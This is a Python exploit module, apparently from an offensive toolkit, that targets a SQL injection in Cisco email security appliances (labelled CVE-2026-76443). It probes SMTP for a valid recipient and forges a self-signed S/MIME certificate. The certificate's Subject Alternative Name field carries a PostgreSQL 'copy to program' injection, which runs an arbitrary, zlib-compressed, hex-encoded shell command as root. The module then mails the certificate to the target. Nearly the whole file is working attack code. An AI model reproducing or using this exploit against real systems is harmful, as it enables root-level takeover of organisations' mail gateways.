#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cisco ESA S/MIME public-key harvesting SQLi (CVE-2026-76443)."""

from __future__ import annotations

import base64
import binascii
import re
import secrets
import zlib
from datetime import datetime, timedelta, timezone
from typing import List, Optional

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import pkcs7
from cryptography.x509.oid import ExtensionOID, NameOID
from pyasn1.codec.der import encoder
from pyasn1.type import char, tag, univ

from lib.protocols.smtp.client import CiscoAsyncOsSmtp, SmtpClient, SmtpError


def cisco_seg_discover_recipient(
    client: SmtpClient,
    nonce: str,
    forced: str = "",
    mail_from: str = "",
) -> str:
    forced = (forced or "").strip()
    if forced:
        return forced
    banner = client.banner.decode(errors="replace")
    host = re.search(r"\A220\s+([^\s]+)", banner)
    labels = host.group(1).split(".") if host else []
    candidates: List[str] = []
    for idx in range(len(labels)):
        domain = ".".join(labels[idx:])
        if domain.count(".") < 1:
            continue
        candidates.append(domain)
    for domain in candidates:
        address = f"{nonce}@{domain}"
        client.ehlo(nonce)
        sender = mail_from.strip() or f"{nonce}@{domain}"
        if not client.send_cmd(f"MAIL FROM:<{sender}>").startswith(b"250"):
            continue
        rep = client.send_cmd(f"RCPT TO:<{address}>")
        client.send_cmd("RSET")
        if rep.startswith(b"250"):
            return address
    raise SmtpError("Could not discover RCPT — set rcpt_to")


def payload_program_for_cmd(shell_cmd: str) -> str:
    packed = binascii.hexlify(zlib.compress(shell_cmd.encode(), 9)).decode()
    decoder = f'zlib.decompress(binascii.unhexlify("{packed}"))'
    loader = f'import binascii,os,zlib;os.execl("/bin/sh","sh","-c",{decoder}.decode())'
    return f"/data/bin/runas root /usr/local/bin/python3 -c '{loader}'"


def _san_extension_der(program: str, nonce: str, domain: str) -> bytes:
    esc = program.replace("'", "''")
    sqli = (
        f'"{nonce}\';copy(select\'\')to program\'{esc}\';'
        "select null::text as public_key,0::double precision as last_updated where false;-- "
        f'"@{domain}'
    )
    identities = [sqli]
    for index in range(499):
        identities.append(
            f'"{nonce}-{index}\';select null::text as public_key,0::double precision as last_updated '
            f"where false;-- \"@{domain}"
        )
    seq = univ.SequenceOf()
    for address in identities:
        ia5 = char.IA5String(address)
        ia5 = ia5.subtype(implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 1))
        seq.append(ia5)
    return encoder.encode(seq)


def build_smime_sqli_mime(
    program: str,
    *,
    nonce: Optional[str] = None,
    domain: str,
    sender: str,
    recipient: str,
    subject: str,
) -> bytes:
    nonce = (nonce or secrets.token_hex(16)).lower()
    san_der = _san_extension_der(program, nonce, domain)
    now = datetime.now(timezone.utc)
    ca_key = rsa.generate_private_key(65537, 2048)
    leaf_key = rsa.generate_private_key(65537, 2048)
    ca_name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, f"{nonce}-ca")])
    ca = (
        x509.CertificateBuilder()
        .subject_name(ca_name)
        .issuer_name(ca_name)
        .public_key(ca_key.public_key())
        .serial_number(1)
        .not_valid_before(now - timedelta(minutes=5))
        .not_valid_after(now + timedelta(days=1))
        .add_extension(x509.BasicConstraints(ca=True, path_length=0), critical=True)
        .sign(ca_key, hashes.SHA256())
    )
    leaf_name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, nonce)])
    leaf = (
        x509.CertificateBuilder()
        .subject_name(leaf_name)
        .issuer_name(ca_name)
        .public_key(leaf_key.public_key())
        .serial_number(2)
        .not_valid_before(now - timedelta(minutes=5))
        .not_valid_after(now + timedelta(days=1))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True,
                key_encipherment=True,
                content_commitment=False,
                data_encipherment=False,
                key_agreement=False,
                key_cert_sign=False,
                crl_sign=False,
                encipher_only=False,
                decipher_only=False,
            ),
            critical=True,
        )
        .add_extension(
            x509.UnrecognizedExtension(oid=ExtensionOID.SUBJECT_ALTERNATIVE_NAME, value=san_der),
            critical=False,
        )
        .add_extension(
            x509.ExtendedKeyUsage([x509.oid.ExtendedKeyUsageOID.EMAIL_PROTECTION]),
            critical=False,
        )
        .sign(ca_key, hashes.SHA256())
    )
    content = (
        "Content-Type: text/plain; charset=us-ascii\r\n"
        "Content-Transfer-Encoding: 7bit\r\n\r\n"
        f"{nonce}\r\n"
    ).encode()
    signed = (
        pkcs7.PKCS7SignatureBuilder()
        .set_data(content)
        .add_signer(leaf, leaf_key, hashes.SHA256())
        .add_certificate(ca)
        .sign(serialization.Encoding.DER, [pkcs7.PKCS7Options.Binary])
    )
    b64 = base64.encodebytes(signed).decode().replace("\n", "\r\n")
    headers = (
        f"From: <{sender}>\r\n"
        f"To: <{recipient}>\r\n"
        f"Subject: {subject}\r\n"
        "MIME-Version: 1.0\r\n"
        f"Content-Type: application/pkcs7-mime; smime-type=signed-data; name={nonce}.p7m\r\n"
        "Content-Transfer-Encoding: base64\r\n"
        "\r\n"
        f"{b64}"
    )
    return headers.encode()


class CiscoSegSmime(CiscoAsyncOsSmtp):
    """CVE-2026-76443 S/MIME SQLi delivery mixin."""

    def cisco_smime_sqli_program(self, shell_cmd: str) -> str:
        return payload_program_for_cmd(shell_cmd)

    def cisco_rcpt_override(self) -> str:
        value = getattr(self, "rcpt_to", "")
        if hasattr(value, "value"):
            value = value.value
        return str(value or "").strip()

    def cisco_deliver_smime_sqli(self, cmd: str) -> str:
        ok, msg = self.cisco_asyncos_probe()
        if not ok:
            raise RuntimeError(msg)
        program = self.cisco_smime_sqli_program(cmd)
        nonce = secrets.token_hex(16).lower()
        recipient = ""
        client = self.smtp_client()
        try:
            client.connect()
            forced = self.cisco_rcpt_override()
            if forced:
                recipient = cisco_seg_discover_recipient(client, nonce, forced=forced)
            else:
                recipient = self.cisco_discover_rcpt(client, nonce)
            domain = recipient.split("@", 1)[-1]
            sender = f"{nonce}@{domain}"
            mime = build_smime_sqli_mime(
                program,
                nonce=nonce,
                domain=domain,
                sender=sender,
                recipient=recipient,
                subject=nonce,
            )
            client.ehlo(nonce)
            client.mail_from(sender)
            client.rcpt_to(recipient)
            reply = client.data(mime)
            if not reply.startswith(b"250"):
                raise SmtpError(f"SMTP DATA failed: {reply!r}")
            return recipient
        finally:
            client.close()